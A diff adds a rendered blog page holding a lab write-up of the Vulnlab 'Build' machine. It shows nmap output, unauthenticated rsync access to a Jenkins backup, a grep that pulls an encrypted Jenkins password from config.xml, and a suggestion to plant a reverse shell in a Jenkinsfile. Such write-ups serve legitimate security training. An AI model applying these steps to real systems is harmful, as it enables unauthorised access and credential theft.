@@ -1,0 +1,863 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Muyi">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set data attribute for CSS variables
+                root.setAttribute("data-theme", theme);
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes once DOM is ready
+            if (document.readyState !== "loading") {
+                document.body.classList.add(theme + "-mode");
+            } else {
+                document.addEventListener("DOMContentLoaded", () => {
+                    document.body.classList.add(theme + "-mode");
+                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
+                });
+            }
+        })();
+    </script>
+    
+    <!-- Critical CSS to prevent flash -->
+    <style>
+        :root[data-theme="dark"] {
+            --background-color: #202124;
+            --background-color-transparent: rgba(32, 33, 36, 0.6);
+            --second-background-color: #2d2e32;
+            --third-background-color: #34353a;
+            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #ffffff;
+            --second-text-color: #eeeeee;
+            --third-text-color: #bebec6;
+            --fourth-text-color: #999999;
+            --default-text-color: #bebec6;
+            --invert-text-color: #373D3F;
+            --border-color: rgba(255, 255, 255, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(255, 255, 255, 0.08);
+            --shadow-color-2: rgba(255, 255, 255, 0.05);
+        }
+        
+        :root[data-theme="light"] {
+            --background-color: #fff;
+            --background-color-transparent: rgba(255, 255, 255, 0.6);
+            --second-background-color: #f8f8f8;
+            --third-background-color: #f2f2f2;
+            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #16171a;
+            --second-text-color: #2f3037;
+            --third-text-color: #5e5e5e;
+            --fourth-text-color: #eeeeee;
+            --default-text-color: #373D3F;
+            --invert-text-color: #bebec6;
+            --border-color: rgba(0, 0, 0, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(0, 0, 0, 0.08);
+            --shadow-color-2: rgba(0, 0, 0, 0.05);
+        }
+        
+        body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+        
+        /* Apply body classes as soon as DOM is ready */
+        :root[data-theme="dark"] body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+    </style>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2025/01/21/vulnlab/vulnlab-build/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/elmo-launch.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/elmo-launch.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/elmo-launch.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Vulnlab-Build | Muyi&#39;s Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":false,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":5,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"dark"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":false,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":false,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Blog for storing the knowledges I need (;","subtitle":{"text":["sudo echo \"subtitle goes here\""],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":true,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":150,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2025/1/22 12:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Muyi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">7</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">37</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			
+			
+			<img src="https://assets.vulnlab.com/build_slide.png" alt="Vulnlab-Build" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75" />
+			
+			<div class="w-full flex items-center absolute bottom-0 justify-start">
+				<h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-semibold backdrop-blur-lg rounded-xl border border-border-color ">Vulnlab-Build</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/elmo.png">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">Muyi</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-01-21 22:33:31</span>
+        <span class="mobile">2025-01-21 22:33:31</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-01-22 22:01:01</span>
+            <span class="mobile">2025-01-22 22:01:01</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Linux/">Linux</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Vulnlab/">Vulnlab</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Easy/">Easy</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h2 id="User"><a href="#User" class="headerlink" title="User"></a>User</h2><h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><p>Starting off with enumeration via nmap</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.94SVN scan initiated Tue Jan 21 14:01:27 2025 as: /usr/lib/nmap/nmap --privileged -p22,53,512,513,514,873,3000,3306,8081 -sVC -o detailed-nmap 10.10.91.238</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.91.238</span><br><span class="line">Host is up (0.26s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE    SERVICE         VERSION</span><br><span class="line">22/tcp   open     ssh             OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   256 47:21:73:e2:6b:96:<span class="built_in">cd</span>:f9:13:11:af:40:c8:4d:d6:7f (ECDSA)</span><br><span class="line">|_  256 2b:5e:ba:f3:72:d3:b3:09:<span class="built_in">df</span>:25:41:29:09:f4:7b:f5 (ED25519)</span><br><span class="line">53/tcp   open     domain          PowerDNS</span><br><span class="line">| dns-nsid:</span><br><span class="line">|   NSID: pdns (70646e73)</span><br><span class="line">|_  id.server: pdns</span><br><span class="line">512/tcp  open     <span class="built_in">exec</span>            netkit-rsh rexecd</span><br><span class="line">513/tcp  open     login?</span><br><span class="line">514/tcp  open     shell           Netkit rshd</span><br><span class="line">873/tcp  open     rsync           (protocol version 31)</span><br><span class="line">3000/tcp open     ppp?</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   GenericLines, Help, RTSPRequest:</span><br><span class="line">|     HTTP/1.1 400 Bad Request</span><br><span class="line">|     Content-Type: text/plain; charset=utf-8</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Request</span><br><span class="line">|   GetRequest:</span><br><span class="line">|     HTTP/1.0 200 OK</span><br><span class="line">|     Cache-Control: max-age=0, private, must-revalidate, no-transform</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Set-Cookie: i_like_gitea=397215be2dc19d68; Path=/; HttpOnly; SameSite=Lax</span><br><span class="line">|     Set-Cookie: _csrf=6PYEuSMgLPwPqsx2wkbFnPSe0rM6MTczNzQzOTI5NzA5OTQyOTE0Ng; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax</span><br><span class="line">|     X-Frame-Options: SAMEORIGIN</span><br><span class="line">|     Date: Tue, 21 Jan 2025 06:01:37 GMT</span><br><span class="line">|     &lt;!DOCTYPE html&gt;</span><br><span class="line">|     &lt;html lang=<span class="string">&quot;en-US&quot;</span> class=<span class="string">&quot;theme-auto&quot;</span>&gt;</span><br><span class="line">|     &lt;<span class="built_in">head</span>&gt;</span><br><span class="line">|     &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span><br><span class="line">|     &lt;title&gt;Gitea: Git with a cup of tea&lt;/title&gt;</span><br><span class="line">|     &lt;<span class="built_in">link</span> rel=<span class="string">&quot;manifest&quot;</span> href=<span class="string">&quot;data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2J1aWxkLnZsOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9idWlsZC52bDozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZXMiOiI1MTJ</span></span><br><span class="line"><span class="string">|   HTTPOptions:</span></span><br><span class="line"><span class="string">|     HTTP/1.0 405 Method Not Allowed</span></span><br><span class="line"><span class="string">|     Allow: HEAD</span></span><br><span class="line"><span class="string">|     Allow: GET</span></span><br><span class="line"><span class="string">|     Cache-Control: max-age=0, private, must-revalidate, no-transform</span></span><br><span class="line"><span class="string">|     Set-Cookie: i_like_gitea=e93f48db281435f5; Path=/; HttpOnly; SameSite=Lax</span></span><br><span class="line"><span class="string">|     Set-Cookie: _csrf=hAGDEKfB-4syaBacozyXvBWfiw06MTczNzQzOTMwMzQ1MDY5MTU1OQ; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax</span></span><br><span class="line"><span class="string">|     X-Frame-Options: SAMEORIGIN</span></span><br><span class="line"><span class="string">|     Date: Tue, 21 Jan 2025 06:01:43 GMT</span></span><br><span class="line"><span class="string">|_    Content-Length: 0</span></span><br><span class="line"><span class="string">3306/tcp filtered mysql</span></span><br><span class="line"><span class="string">8081/tcp filtered blackice-icecap</span></span><br><span class="line"><span class="string">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span></span><br><span class="line"><span class="string">SF-Port3000-TCP:V=7.94SVN%I=7%D=1/21%Time=678F3841%P=x86_64-pc-linux-gnu%r</span></span><br><span class="line"><span class="string">SF:(GenericLines,67,&quot;</span>HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x</span><br><span class="line">SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba</span><br><span class="line">SF:d\x20Request<span class="string">&quot;)%r(GetRequest,1000,&quot;</span>HTTP/1\.0\x20200\x20OK\r\nCache-Contr</span><br><span class="line">SF:ol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nCo</span><br><span class="line">SF:ntent-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_git</span><br><span class="line">SF:ea=397215be2dc19d68;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Coo</span><br><span class="line">SF:kie:\x20_csrf=6PYEuSMgLPwPqsx2wkbFnPSe0rM6MTczNzQzOTI5NzA5OTQyOTE0Ng;\x</span><br><span class="line">SF:20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Opt</span><br><span class="line">SF:ions:\x20SAMEORIGIN\r\nDate:\x20Tue,\x2021\x20Jan\x202025\x2006:01:37\x</span><br><span class="line">SF:20GMT\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\&quot;en-US\&quot;\x20class=\&quot;the</span><br><span class="line">SF:me-auto\&quot;&gt;\n&lt;<span class="built_in">head</span>&gt;\n\t&lt;meta\x20name=\&quot;viewport\&quot;\x20content=\&quot;width=dev</span><br><span class="line">SF:ice-width,\x20initial-scale=1\&quot;&gt;\n\t&lt;title&gt;Gitea:\x20Git\x20with\x20a\x</span><br><span class="line">SF:20cup\x20of\x20tea&lt;/title&gt;\n\t&lt;<span class="built_in">link</span>\x20rel=\&quot;manifest\&quot;\x20href=\&quot;data:</span><br><span class="line">SF:application/json;<span class="built_in">base64</span>,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHR</span><br><span class="line">SF:lYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3Rhcn</span><br><span class="line">SF:RfdXJsIjoiaHR0cDovL2J1aWxkLnZsOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6L</span><br><span class="line">SF:y9idWlsZC52bDozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5n</span><br><span class="line">SF:Iiwic2l6ZXMiOiI1MTJ<span class="string">&quot;)%r(Help,67,&quot;</span>HTTP/1\.1\x20400\x20Bad\x20Request\r\n</span><br><span class="line">SF:Content-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r</span><br><span class="line">SF:\n\r\n400\x20Bad\x20Request<span class="string">&quot;)%r(HTTPOptions,197,&quot;</span>HTTP/1\.0\x20405\x20Me</span><br><span class="line">SF:thod\x20Not\x20Allowed\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nCache-Cont</span><br><span class="line">SF:rol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nS</span><br><span class="line">SF:et-Cookie:\x20i_like_gitea=e93f48db281435f5;\x20Path=/;\x20HttpOnly;\x2</span><br><span class="line">SF:0SameSite=Lax\r\nSet-Cookie:\x20_csrf=hAGDEKfB-4syaBacozyXvBWfiw06MTczN</span><br><span class="line">SF:zQzOTMwMzQ1MDY5MTU1OQ;\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20Sam</span><br><span class="line">SF:eSite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Tue,\x2021\x20J</span><br><span class="line">SF:an\x202025\x2006:01:43\x20GMT\r\nContent-Length:\x200\r\n\r\n<span class="string">&quot;)%r(RTSPR</span></span><br><span class="line"><span class="string">SF:equest,67,&quot;</span>HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/</span><br><span class="line">SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re</span><br><span class="line">SF:quest<span class="string">&quot;);</span></span><br><span class="line"><span class="string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string"># Nmap done at Tue Jan 21 14:03:18 2025 -- 1 IP address (1 host up) scanned in 110.69 seconds</span></span><br></pre></td></tr></table></figure></div>
+<h3 id="Gitea-Jenkins"><a href="#Gitea-Jenkins" class="headerlink" title="Gitea &amp; Jenkins"></a>Gitea &amp; Jenkins</h3><p>Port 3000 hosting self-hosted github –&gt; Gitea, visit the website and access the public repositories without any authentication required.<br>Discovered Jenkinsfile, which defines Jenkins pipeline<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/vulnlab-build/jenkinsfile.png"
+                      alt="jenkinsfile"
+                ></p>
+<blockquote>
+<p>with jenkinsfile, its possible for an attacker to modify it and trigger remote code execution which opens up a vulnerability.</p>
+<p>To do this, edit the <code>Jenkinfiles</code> to include a reverse shell and push it to the repository to trigger the pipeline and generate a shell on the internally-faced Jenkins server, while authenticated that is.</p>
+</blockquote>
+<h3 id="Rsync"><a href="#Rsync" class="headerlink" title="Rsync"></a>Rsync</h3><p>using rsync to read shares without credentials</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">muyi@mag3:~/Desktop/vulnlab/easy/Build~10.10.91.238$ rsync -av --list-only rsync://<span class="variable">$ip</span></span><br><span class="line">backups         backups</span><br><span class="line"></span><br><span class="line">muyi@mag3:~/Desktop/vulnlab/easy/Build~10.10.91.238$ rsync -av --list-only rsync://<span class="variable">$ip</span>/backups</span><br><span class="line">receiving incremental file list</span><br><span class="line">drwxr-xr-x          4,096 2024/05/02 21:26:31 .</span><br><span class="line">-rw-r--r--    376,289,280 2024/05/02 21:26:19 jenkins.tar.gz</span><br><span class="line"></span><br><span class="line">sent 24 bytes  received 82 bytes  30.29 bytes/sec</span><br><span class="line">total size is 376,289,280  speedup is 3,549,898.87</span><br></pre></td></tr></table></figure></div>
+
+<p>after downloading the <code>backups</code> containing <code>jenkins.tar.gz</code>, unzip it and inspect it</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">muyi@mag3:~/Desktop/vulnlab/easy/Build~10.10.91.238/backups$ tar -xvf jenkins.tar.gz</span><br><span class="line">jenkins_configuration/</span><br><span class="line">jenkins_configuration/jenkins.model.ArtifactManagerConfiguration.xml</span><br><span class="line">jenkins_configuration/hudson.plugins.git.GitTool.xml</span><br><span class="line">jenkins_configuration/secrets/</span><br><span class="line">jenkins_configuration/secrets/master.key</span><br><span class="line">jenkins_configuration/secrets/hudson.util.Secret</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
+
+<p>running the following preg, we discovered the encrypted password</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(.venv) muyi@mag3:~/Desktop/vulnlab/easy/Build~10.10.91.238$ grep -re <span class="string">&quot;^\s*&lt;[a-zA-Z]*&gt;&#123;[a-zA-Z0-9=+/]*&#125;&lt;&quot;</span></span><br><span class="line">backups/jenkins_configuration/jobs/build/config.xml:              &lt;password&gt;&#123;AQAAABAAAAAQUNBJaKiUQNaRbPI0/VMwB1cmhU/EHt0chpFEMRLZ9v0=&#125;&lt;/password&gt;</span><br></pre></td></tr></table></figure></div>
